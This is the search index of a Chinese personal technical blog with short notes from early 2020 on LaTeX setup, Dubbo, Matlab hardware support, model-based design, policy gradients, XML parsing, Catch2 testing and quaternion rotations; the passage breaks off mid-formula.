<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Windows下LaTeX安装及使用]]></title>
    <url>%2F2020%2F02%2F27%2FWindows%E4%B8%8BLaTeX%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[最近准备写大论文，为避免Word格式编排的麻烦，同时能够对大论文进行版本管理，决定使用LaTex。下面记录在Windows平台下安装LaTex的过程及其使用方法。 Tex Live Vs MiKTex Vs proTeXtTeX（/tɛx/，常被读作/tɛk/，音译“泰赫”，“泰克”，写作“TEX”），是一个由美国计算机教授高德纳（Donald Ervin Knuth）编写的排版软件。TeX的MIME类型为application/x-tex，是一款自由软件。它在学术界特别是数学、物理学和计算机科学界十分流行。TeX被普遍认为是一个优秀的排版工具，尤其是对于复杂数学公式的处理。利用LaTeX等终端软件，TeX就能够排版出精美的文本以帮助人们辨认和查找。 LaTeX（/ˈlɑːtɛx/，常被读作/ˈlɑːtɛk/或/ˈleɪtɛk/，写作“LATEX”），是一种基于TeX的排版系统，由美国计算机科学家莱斯利·兰伯特在20世纪80年代初期开发，利用这种格式系统的处理，即使用户没有排版和程序设计的知识也可以充分发挥由TeX所提供的强大功能，不必一一亲自去设计或校对，能在几天，甚至几小时内生成很多具有书籍质量的印刷品。对于生成复杂表格和数学公式，这一点表现得尤为突出。因此它非常适用于生成高印刷质量的科技和数学、物理文档。这个系统同样适用于生成从简单的信件到完整书籍的所有其他种类的文档。 LaTex类似于Linux系统，它有多个发行版，例如 MiKTeX 、 proTeXt 和TeX Live，其中proTeXt是基于MiKTeX打包的。因此重点介绍MiKTex与TeX Live的区别。 Texlive包比较全，Miktex占用空间比较小，遇到需要的包需要在线下载。所以，硬盘空间比较充足的，网络不太方便的电脑，可以选择Texlive，反之硬盘空间小，一直保持网络链接的可以选择Miktex。 LaTeX编辑器LaTex编辑器大概分为两种，一种为WYSIWYG，所见即所得，实时预览，类似于Word，另一种是纯文本编辑器，有语法高亮，没有预览功能，编译成PDF后才能预览。 LaTeX编辑器的选择请参考有哪些好的 LaTeX 编辑器？。本人倾向于使用VSCode+Latex Workshop，具体方法参考编写中文Latex(VSCode+TexLive)。 Tex Live安装Tex Live安装请参考最新TeXLive 环境的安装与配置。 参考链接 Latex编译器推荐（面向初学者或者懒得折腾的朋友，主要针对windows用户）,by 郭令举. LaTeX的各种发行版和编辑器的比较,by 灵魂机器. TeX,by wikipedia. LaTeX,by wikipedia. 最新TeXLive 环境的安装与配置,by cying. 有哪些好的 LaTeX 编辑器？,by zhihu. 编写中文Latex(VSCode+TexLive),by 踏歌. 一份其实很短的 LaTeX 入门文档,by 始终. 从零开始 LaTeX 快速入门,by liuchengxu. 在 LaTeX 中进行文学编程,by 始终.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dubbo入门简介]]></title>
    <url>%2F2020%2F02%2F24%2FDubbo%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Apache Dubbo |ˈdʌbəʊ| 是一款高性能、轻量级的开源Java RPC框架，它提供了三大核心能力：面向接口的远程方法调用，智能容错和负载均衡，以及服务自动注册和发现。 应用背景请参考背景. 应用需求请参考需求. Dubbo架构请参考架构. 服务配置请参考应用. 参考链接 Apache Dubbo,by apache.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Matlab树莓派硬件支持平台的搭建]]></title>
    <url>%2F2020%2F02%2F19%2FMatlab%E6%A0%91%E8%8E%93%E6%B4%BE%E7%A1%AC%E4%BB%B6%E6%94%AF%E6%8C%81%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[在今天全球强调科研创新的年代，为何科学的进步与上个世纪相比，却明显进步缓慢呢？也许有人反驳，当今庞大的科研人员，层出不穷的科研成果，极大的物质财富，难道不是科学技术的进步带来的吗？与上个世纪相比，哪里进步缓慢了呢？诚然，当前科技在进步在繁荣，但这种进步繁荣是应用科学的繁荣，而不是基础科学的繁荣。如果将科学比作一棵大树，那么基础科学就是树干，枝干和树叶就是应用科学。树干的粗细决定了树枝和树叶的繁荣，不幸的是，当前基础科学已经很久没有大的进步了。基础科学的进步靠牛顿、麦克斯韦、爱因斯坦这样的天才，而应用科学的进步则靠广大的普通科研人员。那么作为一名普通的从事应用科学研究的科研人员，如何才能有所创新有所进步呢？ 作为一名普通的科研人员，可能经常会有一闪而过的灵光。然而要将这一闪而过的灵光变成切实可行的创新是一个痛苦的过程。这一闪而过的灵光可能涉及很多学科知识，而大部分科研人员不是全才，可能仅在某一方面有过人之处，那么如何试验验证这一灵光就成了大难题。幸运的是，有了Matlab及其推广的基于模型的设计思想，未来应用科学方面的科研创新将不再困难。 有人说，Matlab除了不会生孩子，其他都能干。诚然，Matlab就是广大科研人员的神兵利器。Matlab或许比不上某些领域的专业软件，但胜在全面，该有的都有。科研人员只需掌握它，就可解决至少80%的问题，极大地提高科研效率。 最近在研究各种控制算法，需要安装树莓派和PX4的硬件支持包，发现最新的Matlab 2019b安装PX4硬件支持包比较方便，但无法安装树莓派硬件支持包，而Matlab 2018b则没有这样的问题。 Matlab 2019b无法下载树莓派硬件支持包的问题，可通过Matlab官方提供的下载工具解决，下载地址为Download Hardware Support Packages and Optional Features。 参考链接 Simulink与树莓派-HIL(硬件在环)平台搭建,by Tomato. AUTOSAR架构深度解析,by 末离. Download Hardware Support Packages and Optional Features,by mathworks.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于模型的设计思想]]></title>
    <url>%2F2020%2F02%2F13%2F%E5%9F%BA%E4%BA%8E%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3%2F</url>
    <content type="text"><![CDATA[基于模型的设计（Model-Based Design，简称MBD）是一种数学及可视化的方法，可以用来处理复杂控制系统、信号处理及通讯系统的设计。基于模型的设计可以用在运动控制、工业设计、航天以及车辆应用中。基于模型的设计也是嵌入式系统设计的方法论。 基于模型的设计类似于基于组件的图形用户界面开发，可极大地提高开发的效率，并保证程序的健壮性。 简介基于模型的设计是一种较有效率的设计方式，在支援开发过程（V模型）的同时，在设计过程中建立了沟通用的共同框架。若用这种方式设计控制系统，开发会分为以下四步骤： 为受控体建模。 配合受控体，分析及合成适合的控制器。 针对控制器及受控体进行仿真。 整合上述的步骤来布署控制器。 基于模型的设计和传统的设计方法论有很大的不同。设计者在使用基于模型的设计时，不需使用复杂的架构以及繁多的软件代码，只需利用基于模型的设计来定义系统模型，再配合连续及离散的架构方块来产生进阶的机能特性。使用仿真工具建立的模型可以进行快速应用程序开发、软件测试和验证。不但强化了测试以及验证的程序。有些情形下，可以将这个新的设计方法配合硬件在环的仿真，测试系统的动态效应，不但速度更快，也比传统的设计方法论更加有效率。 基于模型设计的步骤基于模型设计的主要步骤如下： 受控体建模：受控体建模可以以资料驱动（data-driven）为基础，也可以依照首要原则（first principle）建模。资料驱动的建模会配合系统识别或是类似的技术。系统识别会先取得系统在真实世界中的输入输出资料，并进行处理，再配合数学算法来识别系统的模型。在系统识别后，就可以针对受控体设计适合的控制器。首要原则驱动的建模是先找到受控体的统御方程式，再创建方块图模型来实现上述的统御方程式。实体建模（physical modeling）就是一种首要原则驱动的驱动建模方式，模型中会包括许多互相连结的方块，对应实际受控体中的各个元件。 控制器分析及合成：会使用步骤1得到的数学模型来确认模型的动态特性，再依这些特性设计符合特性的控制器。 离线的仿真及实时仿真：会分析动态系统在复杂时变输入下的反应特性。这可以将受授体的简易线性非时变模型和控制器一起进行仿真，也可以用受授体的非线性模型和控制器进行仿真。仿真有助于找到规格、需求以及建模时的错误，而不是在之后实际设计控制器时才发现。实时仿真可以用步骤2的控制器进行代码自动生成（automatically generating code）来达到。代码可以布署在特殊的实时原型电脑中，这个电脑可以执行程式并且控制受控体的运作。假如无法取得受控体的原型，或是配合原型的测试有危险性或是太过昂贵，可以配合受控体模型进行自动代码生成。之后可以将代码布署到另一台电脑上，这台电脑和执行控制体的电脑相连。因此可以实时的测试控制器，不过控制的不是实际的受控体，而是实时仿真的受控体模型。 布署控制器：理想上让步骤2的控制器进行代码自动生成，即可布署控制器。不过一开始时，控制器在实际系统上的性能会和仿真时的性能不同，此时可以用迭代除错方式，分析实际系统上的结果，依分析结果更新控制器模型。配合基于模型设计的工具，可以在统一化可视环境下，进行上述的迭代除错。 优点基于模型的设计相较于传统开发方式的优点有： 基于模型的设计提供一个共同的开发环境，有助于不同的开发团队之间的一般性沟通、资料分析以及系统验证。 工程师可以在系统设计早期定位出错误并且修正错误，此时系统修改造成的时间冲击及财务影响都是最小的。 设计可以复用，有助于提升机能及衍生系统的扩充能力。 工具支持MBD开发的工具主要有： Matlab/Simulink 参考链接 基于模型的设计,by wikipedia. Simulink代码生成C/C++,by 小二黑. 基于模型设计——电力电子的利器,by 陈老四.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[策略梯度方法笔记]]></title>
    <url>%2F2020%2F02%2F10%2F%E7%AD%96%E7%95%A5%E6%A2%AF%E5%BA%A6%E6%96%B9%E6%B3%95%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[使用强化学习实现机器人的连续控制，策略梯度方法是首选。下面即对强化学习中策略梯度方法进行总结。 核心概念免模型学习（Model-Free） vs 有模型学习（Model-Based）不同强化学习算法最重要的区分点之一就是智能体是否能完整了解或学习到所在环境的模型。 环境的模型是指一个预测状态转换和奖励的函数。 有模型学习最大的优势在于智能体能够 提前考虑来进行规划，走到每一步的时候，都提前尝试未来可能的选择，然后明确地从这些候选项中进行选择。智能体可以把预先规划的结果提取为学习策略。这其中最著名的例子就是 AlphaZero。这个方法起作用的时候，可以大幅度提升采样效率 —— 相对于那些没有模型的方法。 有模型学习最大的缺点就是智能体往往不能获得环境的真实模型。如果智能体想在一个场景下使用模型，那它必须完全从经验中学习，这会带来很多挑战。最大的挑战就是，智能体探索出来的模型和真实模型之间存在误差，而这种误差会导致智能体在学习到的模型中表现很好，但在真实的环境中表现得不好（甚至很差）。基于模型的学习从根本上讲是非常困难的，即使你愿意花费大量的时间和计算力，最终的结果也可能达不到预期的效果。 使用模型的算法叫做有模型学习，不基于模型的叫做免模型学习。虽然免模型学习放弃了有模型学习在样本效率方面的潜在收益，但是他们往往更加易于实现和调整。 同策略（on-policy） vs 异策略（off-policy）异策略（off-policy）的代表算法Q-learning，亦称SarasMax，其采样的策略（用于执行，behavior policy) 和更新Q值的策略（用于评估，target policy）不一样，行为策略为贪心策略，而target policy为确定性策略，即选择最Q值最优的action。 同策略（on-policy）的代表算法Sarsa，亦称on-line Q-learning，其采样的策略（用于执行，behavior policy) 和更新Q值的策略（用于评估，target policy）一样,行为策略和目标策略均为贪心策略。Sarsa的每次Q值更新需要知道前一步的状态（state）、前一步的动作（action）、奖赏值（reward）、当前状态（state）、将要执行的动作（action），由此得名Sarsa算法。 在线（online） vs 离线（offline）在计算机科学中，在线机器学习是一种机器学习的方法，其中数据按顺序可用，并且用于在每个步骤中为将来的数据更新我们的最佳预测器，而不是通过学习生成最佳预测器的批处理学习技术 一次对整个训练数据集。 在线学习是机器学习领域中的一种常用技术，在该领域中，计算无法训练整个数据集是不可行的，因此需要核心算法。 它也用于算法必须动态适应数据中的新模式的情况下，或者在数据本身随时间而变的情况下（例如，股价预测）使用。 在线学习算法可能易于遭受灾难性干扰，这一问题可以通过增量学习方法来解决。 在机器学习中，采用离线学习的系统在初始训练阶段完成后不会改变其对目标函数的近似值。这些系统通常也是渴望学习的示例。 在在线学习中，只有一组可能的元素是已知的，而在离线学习中，学习者则知道这些元素的标识以及它们显示的顺序。 强化学习分类 图1 强化学习简单分类 符号定义下表给出强化学习常用符号定义。 符号 含义 $s \in \mathcal{S}$ 状态。 $a \in \mathcal{A}$ 动作。 $r \in \mathcal{R}$ 回报。 $S{t}, A{t}, R_{t}$ 一个轨迹中第t个时间步对应的状态、动作以及回报。我可能会偶尔使用$s_t,a_t,r_t$来代替。 $\gamma$ 折扣因子；用于惩罚未来回报中的不确定性；$0&lt;γ≤1$。 $G_{t}$ 累积回报；或者说累积折扣回报；$G{t}=\sum{k=0}^{\infty} \gamma^{k} R_{t+k+1}$。 $P\left(s^{\prime}, r\vert s, a\right)$ 在当前状态s下采取动作a后转移到下一个状态 s′ 并得到回报 r 的概率。 $\pi(a\vert s)$ 随机策略（智能体行为逻辑）；$\pi_{\theta}( .)$代表由θ参数化的策略。 $μ(s)$ 确定性策略；虽然也可以把确定性策略记为$π(s)$，但是采用一个不同的字母可以让我们更容易分辨一个策略到底是确定性的还是随机的。π或者μ都是强化学习算法要学习的目标。 $V(s)$ 状态-值函数衡量状态s的期望累积回报；$V_{w}( .)$代表由w参数化的状态-值函数。 $V^{\pi}(s)$ 当智能体遵循策略π时状态s的期望累积回报；$V^{\pi}(s)=\mathbb{E}{a \sim \pi}\left[G{t}\vert S_{t}=s\right]$ $Q(s,a)$ 动作-值函数，与状态-值函数类似，但是它衡量在状态s下采取动作a后的期望累积回报；$Q_{w}( .)$代表由w参数化的动作-值函数。 $Q^{\pi}(s, a)$ 与$V^{\pi}(s)$类似，当智能体遵循策略π时，在状态s下采取动作a后的期望累积回报；$Q^{\pi}(s, a)=\mathbb{E}{a \sim \pi}\left[G{t}\vert S{t}=s,A{t}=a\right]$ $A(s, a)$ 优势函数，$A(s,a)=Q(s,a)−V(s)$；可以认为优势函数是加强版本的动作-值函数，但是由于它采用状态-值函数作为基准使得它具有更小的方差。 策略梯度方法强化学习的目标是为智能体找到一个最优的行为策略从而获取最大的回报。策略梯度方法主要特点在于直接对策略进行建模并优化。策略通常被建模为由θ参数化的函数$\pi_{\theta}(a | s)$。回报（目标）函数的值受到该策略的直接影响，因而可以采用很多算法来对θ进行优化来最大化回报（目标）函数。 回报（目标）函数定义如下： J(\theta)=E_{\tau \sim \pi_{\theta}} [R(\tau)]=\sum_{s \in \mathcal{S}} d^{\pi}(s) V^{\pi}(s)=\sum_{s \in \mathcal{S}} d^{\pi}(s) \sum_{a \in \mathcal{A}} \pi_{\theta}(a | s) Q^{\pi}(s, a)其中$d^{\pi}(s)$代表由$\pi_{\theta}$引出的马尔科夫链的平稳分布（π下的在线策略状态分布）。 使用梯度上升方法，我们可以将参数 $\theta$ 往梯度 $\nabla{\theta} J(\theta)$ 给出的方向进行改变从而去找到最优的 $\theta$ 使得其对应的策略 $\pi{\theta}$ 能够给智能体带来最大的期望累积回报。 \theta_{k+1} = \theta_k + \alpha \left. \nabla_{\theta} J(\pi_{\theta}) \right|_{\theta_k}.策略性能的梯度 $\nabla{\theta} J(\pi{\theta})$ ，通常被称为 策略梯度 ，优化策略的算法通常被称为 策略算法 。 策略梯度定理\begin{aligned} \nabla_\theta J(\theta) &\propto \sum_{s \in \mathcal{S}} d^\pi(s) \sum_{a \in \mathcal{A}} Q^\pi(s, a) \nabla_\theta \pi_\theta(a \vert s) &\\ &= \sum_{s \in \mathcal{S}} d^\pi(s) \sum_{a \in \mathcal{A}} \pi_\theta(a \vert s) Q^\pi(s, a) \frac{\nabla_\theta \pi_\theta(a \vert s)}{\pi_\theta(a \vert s)} &\\ &= \mathbb{E}_\pi [Q^\pi(s, a) \nabla_\theta \ln \pi_\theta(a \vert s)] & \scriptstyle{\text{; 因为 } (\ln x)’ = 1/x} \end{aligned}$\mathbb{E}{\pi}$代表$\mathbb{E}{s \sim d{\pi}, a \sim \pi{\theta}}$，下标表示遵循策略$\pi_{\theta}$（在线策略）时状态以及动作的分布。 深度确定性策略梯度 （DDPG）DDPG（Lillicrap, et al., 2015）是深度确定性策略梯度（Deep Deterministic Policy Gradient）的缩写，是一个结合了DPG以及DQN的无模型离线演员-评论家算法。DQN（深度Q网络）通过经验回访以及冻结目标网络的方式来稳定Q函数的训练过程。原始的DQN算法只能在离散的动作空间上使用，DDPG算法在学习一个确定性策略的同时通过演员-评论家框架将其扩展到连续的动作空间中。 图2 深度确定性策略梯度算法伪代码 参考链接 策略梯度方法,by Abracadabra. A (Long) Peek into Reinforcement Learning,by Lilian Weng. 第三部分：策略优化介绍,by spinningup. 深度强化学习研究笔记,by jackhuang. 异策略（Q-learning） v.s. 同策略（Sarsa）,by MOMO. Online_machine_learning,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科学研究的标准流程]]></title>
    <url>%2F2020%2F02%2F09%2F%E7%A7%91%E5%AD%A6%E7%A0%94%E7%A9%B6%E7%9A%84%E6%A0%87%E5%87%86%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[科学研究是每一个科研人必备的技能，那么科学研究应如何入手呢？通常科学研究应遵循如下标准流程： 问题牵引形式化定义问题问题等价转换建立模型已有数学模型类似数学模型重建数学模型模型求解收集数据求解模型验证模型模型预测灵敏度分析]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XML解析入门]]></title>
    <url>%2F2020%2F01%2F30%2FXML%E8%A7%A3%E6%9E%90%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[最近在研究编写飞行动力学模型，发现需要使用很多用于插值的数据，这些数据可以是一维向量、二维表格或三维数据。在代码中直接硬编码存储是不合适的，降低程序的灵活性。直接使用文本文档存储也不合适，这些插值数据明显具有结构化的特征。于是想到用XML来存储表示这些数据。下面总结介绍XML解析相关知识。 XML简介可扩展标记语言（英语：Extensible Markup Language，简称：XML）是一种标记语言。标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。如何定义这些标记，既可以选择国际通用的标记语言，比如HTML，也可以使用像XML这样由相关人士自由决定的标记语言，这就是语言的可扩展性。XML是从标准通用标记语言（SGML）中简化修改出来的。它主要用到的有可扩展标记语言、可扩展样式语言（XSL）、XBRL和XPath等。 XML结构XML定义结构、存储信息、传送信息。下例为小张发送给大元的便条，存储为XML。 1234567&lt;?xml version=&quot;1.0&quot;?&gt; &lt;小纸条&gt; &lt;收件人&gt;大元&lt;/收件人&gt; &lt;發件人&gt;小張&lt;/發件人&gt; &lt;主題&gt;問候&lt;/主題&gt; &lt;具體內容&gt;早啊，飯吃了沒？ &lt;/具體內容&gt; &lt;/小纸条&gt; 每个XML文档都由XML序言开始，在前面的代码中的第一行就是XML序言，&lt;?xml version=”1.0”?&gt;。这一行代码会告诉解析器或浏览器这个文件应该按照XML规则进行解析。 但是，根元素到底叫&lt;小纸条&gt;还是&lt;小便条&gt;，则是由文档类型定义（DTD）或XML纲要（XML Schema）定义的。如果DTD规定根元素必须叫&lt;小便条&gt;，那么若写作&lt;小纸条&gt;就不符合要求。这种不符合DTD或XML纲要的要求的XML文档，被称作不合法的XML，反之则是合法的XML。 XML文件的第二行并不一定要包含文档元素；如果有注释或者其他内容，文档元素可以迟些出现。 XML解析器C++类型XML解析器有： Boost.PropertyTree - A property tree parser/generator that can be used to parse XML/JSON/INI/Info files. [Boost] Expat - An XML parser library written in C. [MIT] Libxml2 - The XML C parser and toolkit of Gnome. [MIT] libxml++ - An XML Parser for C++. [LGPL2] Mini-XML - A small XML parsing library written in ANSI C. [LGPL2 with exceptions] PugiXML - A light-weight, simple and fast XML parser for C++ with XPath support. [MIT] RapidXml - An attempt to create the fastest XML parser possible, while retaining useability, portability and reasonable W3C compatibility. [Boost] TinyXML - A simple, small, minimal, C++ XML parser that can be easily integrating into other programs. [zlib] TinyXML2 - A simple, small, efficient, C++ XML parser that can be easily integrating into other programs. [zlib] TinyXML++ - A completely new interface to TinyXML that uses MANY of the C++ strengths. Templates, exceptions, and much better error * handling. [MIT] Xerces-C++ - A validating XML parser written in a portable subset of C++. [Apache2] 推荐使用TinyXML2。 参考链接 C++解析xml有什么好用的轮子?,by 知乎. awesome-cpp xml,by fffaraz. XML与C++对象的相互转化,by Mr_John_Liang. JSON与XML的区别比较,by SanMaoSpace.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件开发文档的编写方法]]></title>
    <url>%2F2020%2F01%2F22%2F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3%E7%9A%84%E7%BC%96%E5%86%99%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[软件开发文档是软件开发过程的输出产物。软件开发过程的不同阶段将产生不同的软件开发文档。例如：软件需求分析阶段将产生软件需求规格说明书，软件概要设计阶段将产生概要设计说明书，软件详细设计阶段将产生详细设计说明书。按照软件工程的原则，软件开发过程输出这些文档的目的是为了保障软件开发的质量，确保软件项目能够按时完成，并保质保量。下面重点介绍各类软件开发文档的编写方法。 软件过程模型软件过程模型是软件过程的简化表示。典型的软件过程模型有：瀑布模型、增量式开发模型和面向服用的软件工程模型。以瀑布模型为例，其涉及的开发活动如图1所示。 图1 瀑布模型 各个开发活动对应产出的软件开发文档主要有： 可行性研究报告 项目开发计划 软件需求说明书 概要设计说明书 详细设计说明书 数据库设计说明书 数据要求说明书 测试计划 测试分析报告 项目开发总结报告 操作手册 用户手册 开发进度月报 软件开发文档可行性研究报告 图2 可行性研究报告 项目开发计划 图3 项目开发计划 软件需求说明书 图4 软件需求说明书 概要设计说明书 图5 概要设计说明书 详细设计说明书 图6 详细设计说明书 数据库设计说明书 图7 数据库设计说明书 数据要求说明书 图8 数据要求说明书 测试计划 图9 测试计划 测试分析报告 图10 测试分析报告 项目开发总结报告 图11 项目开发总结报告 操作手册 图12 操作手册 用户手册 图13 用户手册 软件开发文档的使用软件文档分类 图14 软件文档分类 软件文档读者 图15 软件文档读者 软件文档使用 图16 软件文档使用 参考链接 软件工程,by wikipedia. 软件需求，概要设计，详细设计（文档）怎么做，做什么？,by 安东尼_Anthony. 软件工程文档总结,by BONIC. 国标：计算机软件文档编制规范,by 宋哥.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CPlusPlus不常用语法解析]]></title>
    <url>%2F2020%2F01%2F21%2FCPlusPlus%E4%B8%8D%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[近年来C++发展很快，出现了一些新的语法和特性。熟练掌握这些语法和特性，可提高编写C++代码的效率。下面即简要介绍这些C++语法和特性。 const=0在类声明中，会出现const=0语法，如下所示： 12345class Weapon&#123; public: virtual void attack() const = 0;&#125;; 在此处 =0 说明该类成员函数是一个纯虚函数。而将const放在成员函数之后，表示该成员函数禁止修改该类的数据成员(mutable成员除外)。如果您无意中修改了该类的数据成员，编译器会报告一个错误。 参考链接 关于virtual：c ++：const = 0的方法原型的代码说明,by 码农家园. C++构造函数和析构函数的调用顺序,by 靖心.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CPlusPlus单元测试框架Catch入门]]></title>
    <url>%2F2020%2F01%2F15%2FCPlusPlus%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6Catch%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[最近在编写一个飞行力学的类库，随着类数量的增加，代码越来越复杂，质量越来越难以控制，因此引入单元测试，通过自动化测试以保障代码质量，防止因代码修改引入新的Bug。C++已经有一些成熟的代码测试框架，例如：Google Test, Boost.Test, CppUnit, Cute，等等。通过综合分析和比较，最终选择Catch2测试框架。选择该测试框架的原因是其够轻量级，够简单。 Catch2简介Catch2是轻量级的C++的多范式测试框架。 它也支持Objective-C（也许还有C）。 它主要作为单个头文件分发，尽管某些扩展可能需要其他头文件。 关键特征 快速且非常容易上手。 只需下载catch.hpp，＃include它就可以了。 没有外部依赖性。 只要您可以编译C ++ 11并拥有C ++标准库即可。 将测试用例编写为自注册函数（或方法，如果您愿意的话）。 将测试用例划分为几个部分，每个部分都是独立运行的（消除了对夹具的需求）。 使用BDD样式的“时准时限”部分以及传统的单元测试用例。 仅一个核心声明宏可以进行比较。 使用标准C / C ++运算符进行比较-但是完整的表达式已分解，并且记录了lhs和rhs值。 测试使用自由格式的字符串命名-合法标识符中没有其他名称。 核心特征 可以对测试进行标记，以方便地运行临时的测试组。 故障可能（可选）进入Windows和Mac上的调试器。 输出通过模块化报告器对象。 包括基本的文本和XML报告程序。 自定义记者可以轻松添加。 支持JUnit xml输出以与第三方工具（例如CI服务器）集成。 提供了默认的main（）函数，但您可以提供自己的控件来进行完全控制（例如，集成到自己的测试运行器GUI中）。 提供了命令行解析器，如果您选择提供自己的main（）函数，该解析器仍可以使用。 Catch可以测试自己。 替代性断言宏报告失败，但不中止测试用例 浮点公差比较是使用表达性的Approx（）语法构建的。 内部和友好的宏是隔离的，因此可以管理名称冲突 匹配器 Catch示例使用Catch进行单元测试，只需简单掌握TEST_CASE、REQUIRE、SECTION三个宏即可编写绝大部分的测试用例。简单示例如下： 1234567891011121314151617181920212223242526272829303132TEST_CASE( &quot;vectors can be sized and resized&quot;, &quot;[vector]&quot; ) &#123; std::vector&lt;int&gt; v( 5 ); REQUIRE( v.size() == 5 ); REQUIRE( v.capacity() &gt;= 5 ); SECTION( &quot;resizing bigger changes size and capacity&quot; ) &#123; v.resize( 10 ); REQUIRE( v.size() == 10 ); REQUIRE( v.capacity() &gt;= 10 ); &#125; SECTION( &quot;resizing smaller changes size but not capacity&quot; ) &#123; v.resize( 0 ); REQUIRE( v.size() == 0 ); REQUIRE( v.capacity() &gt;= 5 ); &#125; SECTION( &quot;reserving bigger changes capacity but not size&quot; ) &#123; v.reserve( 10 ); REQUIRE( v.size() == 5 ); REQUIRE( v.capacity() &gt;= 10 ); &#125; SECTION( &quot;reserving smaller does not change size or capacity&quot; ) &#123; v.reserve( 0 ); REQUIRE( v.size() == 5 ); REQUIRE( v.capacity() &gt;= 5 ); &#125;&#125; 上述示例中，对于每个SECTION，TEST_CASE都是从头开始执行的，因此，当我们进入每个部分时，我们知道vector的大小为5，容量至少为5。通过REQUIRE宏在顶层确保vector大小和容量的正确性。这是可行的，因为SECTION宏包含一个if语句，该语句回调Catch来查看是否应执行该节。 通过TEST_CASE，每次运行都会执行一个叶子部分。 其他部分将被跳过。 下次执行下一个部分，依此类推，直到没有新的部分为止。 参考链接 Writing Unit Tests with Catch and CMake,by filebox. Integrating catch2 with CMake and Jenkins,by mariuselvert. Catch2,by catchorg. C++单元测试入门,by pezy.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[四元数与旋转矩阵]]></title>
    <url>%2F2020%2F01%2F15%2F%E5%9B%9B%E5%85%83%E6%95%B0%E4%B8%8E%E6%97%8B%E8%BD%AC%E7%9F%A9%E9%98%B5%2F</url>
    <content type="text"><![CDATA[四元数是由爱尔兰数学家威廉·卢云·哈密顿在1843年创立出的数学概念。单位四元数（Unit quaternion）可以用于表示三维空间里的旋转。它与常用的另外两种表示方式（三维正交矩阵和欧拉角）是等价的，但是避免了欧拉角表示法中的万向锁问题。比起三维正交矩阵表示，四元数表示能够更方便地给出旋转的转轴与旋转角。 欧拉角欧拉角（Euler Angles）是一种描述三维旋转的方式，根据欧拉旋转定理，任何一个旋转都可以用三个旋转的参数来表示。但欧拉角的描述方式有很多种，并没有一个统一标准。对于定义一个欧拉角，需要明确的内容包括： 三个旋转角的组合方式（是xyz还是yzx还是zxy） 旋转角度的参考坐标系统（旋转是相对于固定的坐标系还是相对于自身的坐标系） 使用旋转角度是左手系还是右手系 三个旋转角的记法 旋转角的记法 顺序 飞行器 望远镜 符号 角速度 第一 heading azimuth $θ$ yaw 第二 attitude elevation $ϕ$ pitch 第三 bank tilt $ψ$ roll 旋转矩阵对于两个三维点 $p_1(x_1, y_1, z_1)$，$p_2(x_2,y_2,z_2)$，由点 $p_1$ 经过旋转矩阵 $R$ 旋转到 $p_2$，则有： R = \left[ \begin{matrix} r_{11} & r_{12} & r_{13}\\ r_{21} & r_{22} & r_{23}\\ r_{31} & r_{32} & r_{33} \end{matrix} \right]\left[ \begin{matrix} x_2 \\ y_2 \\ z_2 \end{matrix} \right] = R \left[ \begin{matrix} x_1 \\ y_1 \\ z_1 \end{matrix} \right]注：旋转矩阵为正交矩阵$RR^T=E$ 绕x轴旋转： R_x(\theta) = \left[ \begin{matrix} 1 & 0 & 0\\ 0 & cos\theta & -sin\theta\\ 0 & sin\theta & cos\theta \end{matrix} \right] 绕y轴旋转: R_y(\theta) = \left[ \begin{matrix} cos\theta & 0 & sin\theta\\ 0 & 1 & 0\\ -sin\theta & 0 & cos\theta \end{matrix} \right] 绕z轴旋转： R_z(\theta) = \left[ \begin{matrix} cos\theta & -sin\theta & 0\\ sin\theta & cos\theta & 0\\ 0 & 0 & 1 \end{matrix} \right] 任意旋转矩阵： 任何一个旋转可以表示为依次绕着三个旋转轴旋三个角度的组合。这三个角度称为欧拉角。 由欧拉角求旋转矩阵设三个轴$x，y，z$的欧拉角分别为$θ_x,θ_y,θ_z$，正弦值、余弦值分别为$s_x, c_x, s_y, c_y, s_z, c_z$那么旋转矩阵为： R(\theta_x,\theta_y,\theta_z)=R_z(\theta_z)R_y(\theta_y)R_x(\theta_x) = \left[ 